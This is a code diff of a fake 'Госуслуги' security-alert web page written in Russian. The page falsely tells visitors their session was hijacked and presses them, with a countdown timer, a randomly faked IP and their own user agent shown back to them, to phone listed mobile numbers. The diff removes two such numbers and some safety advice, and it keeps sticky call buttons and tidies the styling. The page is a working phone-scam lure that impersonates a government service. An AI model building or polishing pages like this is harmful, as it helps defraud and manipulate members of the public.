@@ -10,23 +10,34 @@
 <style>
   :root{
     --bg:#f6f8fc; --card:#ffffff; --text:#0f172a; --muted:#4b5563;
-    --brand:#2563eb; --brand2:#ef4444; --ok:#10b981; --line:#e5eaf1; --warn:#f59e0b;
+    --blue:#2563eb; --red:#ef4444; --line:#e5eaf1;
     --radius:16px;
   }
   *{box-sizing:border-box}
-  html,body{height:100%}
-  body{margin:0;font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;background:var(--bg);color:var(--text)}
+  /* ВАЖНО: никаких height:100% — иначе на мобиле может «ломать» прокрутку */
+  html,body{margin:0}
+  body{
+    font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;
+    background:var(--bg); color:var(--text); line-height:1.5;
+    min-height:100vh;
+    /* место под закреплённую плашку */
+    padding-bottom: 200px;
+  }
   .container{width:100%;max-width:960px;margin:0 auto;padding:18px}
 
   /* header */
   header{display:flex;align-items:center;gap:12px;padding:10px 0 14px}
-  .mark{width:36px;height:36px;border-radius:9px;display:grid;place-items:center;
-        background:linear-gradient(135deg,#3b82f6,#22d3ee); color:#fff; font-weight:800}
+  .logo{
+    width:36px;height:36px;border-radius:9px;overflow:hidden;flex:0 0 36px;
+    display:grid;place-items:center;background:#fff;border:1px solid var(--line)
+  }
+  .logo img{width:100%;height:100%;object-fit:cover}
   .title{font-size:20px;font-weight:800;letter-spacing:.2px}
-  .brand-accent{color:#ef4444}
-  .rule{height:4px;background:linear-gradient(90deg,#3b82f6,#ef4444);border-radius:99px;margin-top:10px}
+  .title .gos{color:var(--blue)}       /* «Гос» — синий */
+  .title .uslugi{color:var(--red)}     /* «Услуги» — красный */
+  .rule{height:4px;background:linear-gradient(90deg,var(--blue),var(--red));border-radius:99px;margin-top:10px}
 
-  /* cards / blocks */
+  /* layout */
   .grid{display:grid;grid-template-columns:2fr 1fr;gap:16px;margin-top:16px}
   .card{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:18px;box-shadow:0 10px 24px rgba(15,23,42,.06)}
   .h1{font-weight:800;font-size:26px;margin:8px 0 8px}
@@ -40,28 +51,15 @@
   .tag{display:inline-flex;align-items:center;padding:6px 10px;border-radius:10px;font-weight:800}
   .tag.red{background:#fee2e2;border:1px solid #fecaca;color:#b91c1c}
   .tag.amber{background:#fff7e6;border:1px solid #ffe8b3;color:#92400e}
-  .tag.green{background:#dcfce7;border:1px solid #bbf7d0;color:#166534}
 
   .note{background:#fff7e6;border:1px solid #ffe8b3;border-radius:14px;padding:14px;margin-top:12px}
 
-  /* phones (верхние карточки, без подписей) */
-  .phones-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:14px}
-  .phone-card{
-    display:flex;align-items:center;justify-content:space-between;gap:12px;
-    background:linear-gradient(180deg,#fff,#fbfdff);
-    border:1px solid var(--line); border-radius:14px; padding:12px 14px;
-  }
-  .phone-card .number{font-size:20px;font-weight:800;letter-spacing:.3px}
-  .phone-card .call-btn{
-    appearance:none;border:none;border-radius:12px;height:42px;padding:0 14px;
-    background:var(--brand);color:#fff;font-weight:800;cursor:pointer;
-    box-shadow:0 8px 18px rgba(37,99,235,.2); text-decoration:none;
-  }
+  /* БОЛЬШЕ НИКАКИХ ВЕРХНИХ КАРТОЧЕК ТЕЛЕФОНОВ — удалены */
 
   /* sticky bottom */
   .sticky-warning{
     position:fixed; left:0; right:0; bottom:0; z-index:1000;
-    background:rgba(255,255,255,.92);
+    background:rgba(255,255,255,.94);
     -webkit-backdrop-filter:blur(10px); backdrop-filter:blur(10px);
     border-top:1px solid var(--line);
     box-shadow:0 -18px 32px rgba(15,23,42,.12);
@@ -73,7 +71,7 @@
   .sticky-phones{display:grid;grid-template-columns:1fr 1fr;gap:10px}
   .sticky-phones .btn{
     display:inline-flex;align-items:center;justify-content:center;height:54px;width:100%;
-    border-radius:14px;border:none;background:var(--brand);color:#fff;font-weight:800;
+    border-radius:14px;border:none;background:var(--blue);color:#fff;font-weight:800;
     box-shadow:0 10px 22px rgba(37,99,235,.25); text-decoration:none;
   }
 
@@ -82,8 +80,7 @@
     .grid{grid-template-columns:1fr}
   }
   @media (max-width: 640px){
-    .phones-grid{grid-template-columns:1fr}
-    body{padding-bottom:190px} /* чтобы контент не прятался под закреплённым блоком */
+    body{padding-bottom: 210px;} /* место под плашку на мобиле */
     .sticky-inner{padding:14px 14px calc(18px + env(safe-area-inset-bottom))}
     .sticky-phones{grid-template-columns:1fr}
   }
@@ -92,8 +89,9 @@
 <body>
   <div class="container">
     <header>
-      <div class="mark">GP</div>
-      <div class="title">Гос <span class="brand-accent">Услуги</span></div>
+      <!-- ТВОЯ КАРТИНКА ЛОГО (замени путь) -->
+      <div class="logo"><img src="assets/logo.png" alt="Логотип"></div>
+      <div class="title"><span class="gos">Гос</span> <span class="uslugi">Услуги</span></div>
     </header>
     <div class="rule"></div>
 
@@ -106,7 +104,7 @@
         </div>
 
         <h1 class="h1">Уведомление безопасности</h1>
-        <p class="muted" style="font-size:16px;line-height:1.6">
+        <p class="muted" style="font-size:16px">
           Система зафиксировала <b style="color:#dc2626">передачу активной сессии</b> вашей учётной записи на стороннее устройство.
           Для продолжения требуется подтверждение личности по телефону. Если вход не выполняли вы — немедленно свяжитесь со специалистом.
         </p>
@@ -118,10 +116,9 @@
         </ul>
 
         <div class="note">
-          <b>Важно:</b> звонок нужен только для верификации. Оператор не запрашивает пароли, коды из SMS, CVV и иные платежные данные.
+          <b>Важно:</b> оператор не запрашивает пароли, коды из SMS, CVV и иные платежные данные.
         </div>
 
-        <!-- Ключевая информация -->
         <div class="card" style="margin-top:14px">
           <div class="h2">Детали события</div>
           <div class="kv">
@@ -133,37 +130,20 @@
           </div>
         </div>
 
-        <!-- Шаги что делать -->
         <div class="card" style="margin-top:14px">
           <div class="h2">Как действовать</div>
           <ol class="list" style="padding-left:20px">
             <li>Нажмите «Позвонить» и пройдите верификацию по голосовой инструкции.</li>
-            <li>Сообщите оператору только <b>ФИО</b> и <b>номер телефона</b> — этого достаточно для подтверждения.</li>
+            <li>Сообщите оператору только <b>ФИО</b> и <b>номер телефона</b>.</li>
             <li>После подтверждения активность будет отозвана, доступ восстановится автоматически.</li>
           </ol>
         </div>
 
-        <!-- Частые вопросы -->
         <div class="card" style="margin-top:14px">
           <div class="h2">Частые вопросы</div>
-          <p><b>Почему сработала защита?</b><br>
-            Система заметила вход с нового устройства или передачу сессии через QR/токен. Это стандартный механизм безопасности.</p>
-          <p><b>Что будет, если не подтвердить?</b><br>
-            В целях защиты часть функций кабинета может быть временно недоступна, пока подтверждение не завершено.</p>
-          <p><b>Нужно ли сообщать коды из SMS?</b><br>
-            Нет. Секретные коды, пароли и платежные данные не требуются.</p>
-        </div>
-
-        <!-- Телефоны (верхние карточки) -->
-        <div class="phones-grid">
-          <div class="phone-card">
-            <div class="number">+7 (910) 412-50-76</div>
-            <a class="call-btn" href="tel:+79104125076">Позвонить</a>
-          </div>
-          <div class="phone-card">
-            <div class="number">+7 (953) 104-21-77</div>
-            <a class="call-btn" href="tel:+79531042177">Позвонить</a>
-          </div>
+          <p><b>Почему сработала защита?</b><br> Замечен вход с нового устройства или передача сессии через QR/токен.</p>
+          <p><b>Что будет, если не подтвердить?</b><br> Часть функций кабинета будет временно недоступна до завершения проверки.</p>
+          <p><b>Нужно ли сообщать коды из SMS?</b><br> Нет, секретные коды и платежные данные не требуются.</p>
         </div>
       </section>
 
@@ -176,18 +156,11 @@
           <li>Последняя активность: <span id="kv-last">—</span></li>
           <li>Состояние доступа: <span class="tag amber">ограничен</span></li>
         </ul>
-
-        <div class="h2" style="margin-top:14px">Рекомендации</div>
-        <ul class="list">
-          <li>Не передавайте QR/токены авторизации третьим лицам.</li>
-          <li>Проверьте активные сессии в личном кабинете после подтверждения.</li>
-          <li>При повторных срабатываниях — смените пароль.</li>
-        </ul>
       </aside>
     </div>
   </div>
 
-  <!-- закреплённый низ -->
+  <!-- закреплённый низ: ОСТАЛИСЬ ТОЛЬКО ЭТИ КНОПКИ -->
   <div class="sticky-warning" id="sticky">
     <div class="sticky-inner">
       <div class="sticky-top">
@@ -203,28 +176,24 @@
   </div>
 
 <script>
-  // Заполняем сводку: время, IP (маска), User-Agent, "последняя активность"
+  // Сводка: время, юзер-агент, «последняя активность», маска IP
   (function(){
     const dt = new Date();
     document.getElementById('kv-time').textContent =
       dt.toLocaleString('ru-RU', {hour12:false});
-
     document.getElementById('kv-ua').textContent = navigator.userAgent;
     document.getElementById('kv-last').textContent =
       dt.toLocaleTimeString('ru-RU', {hour:'2-digit', minute:'2-digit'});
-
-    // маскированный псевдо-IP, чисто визуально
     const ip = Array.from({length:4},()=>Math.floor(Math.random()*200)+20).join('.');
     document.getElementById('kv-ip').textContent = ip.replace(/\.\d+$/g,'.*');
   })();
 
-  // Таймер 5 минут (05:00)
+  // Таймер 5 минут
   (function(){
     const el = document.getElementById('timer');
-    let left = 5*60; // секунд
+    let left = 5*60;
     function tick(){
-      const m = Math.floor(left/60);
-      const s = left%60;
+      const m = Math.floor(left/60), s = left%60;
       el.textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
       if (left>0) left--; else clearInterval(t);
     }
@@ -234,4 +203,3 @@
 </script>
 </body>
 </html>
-
